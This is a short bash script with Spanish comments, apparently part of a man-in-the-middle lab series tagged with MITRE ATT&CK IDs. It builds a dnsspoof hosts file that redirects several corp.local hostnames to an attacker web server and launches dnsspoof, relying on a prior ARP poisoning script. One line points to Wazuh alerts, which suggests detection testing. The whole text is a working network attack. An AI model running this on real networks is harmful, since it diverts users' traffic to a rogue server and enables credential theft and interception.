#!/bin/bash
# 03_dns_spoof.sh - DNS Spoofing
# MITRE ATT&CK T1557 + T1071.004
# Requiere: 02_arp_poison.sh activo
source /opt/mitm-scripts/targets.sh

IFACE="${1:-eth0}"

cat > /tmp/dnsspoof_hosts.conf << EOF
$WEBSERVER_IP  *.corp.local
$WEBSERVER_IP  web-internal
$WEBSERVER_IP  intranet.corp.local
EOF

echo "[*] Hosts a redirigir:"
cat /tmp/dnsspoof_hosts.conf
echo ""
echo "[!] PREREQUISITO: Ejecuta 02_arp_poison.sh primero"
echo "[!] Observa alertas en Wazuh: SID 9000004"
echo ""
dnsspoof -i $IFACE -f /tmp/dnsspoof_hosts.conf
